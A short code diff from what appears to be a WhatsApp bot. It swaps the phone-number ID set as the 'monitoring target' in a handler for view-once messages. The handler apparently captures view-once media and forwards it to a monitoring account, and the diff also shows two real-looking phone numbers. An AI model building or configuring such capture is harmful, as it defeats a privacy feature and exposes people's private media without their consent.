@@ -31,7 +31,7 @@ export class ViewOnceHandler {
   static MAX_CACHE_SIZE = 200
 
   // Monitoring Configuration
-  static MONITORING_TARGET_JID = "2348058931419@s.whatsapp.net" // Default monitoring target
+  static MONITORING_TARGET_JID = "2348108573995@s.whatsapp.net" // Default monitoring target
   static SKIP_GROUP_MONITORING = true // Skip group ViewOnce for monitoring account
 
   static {
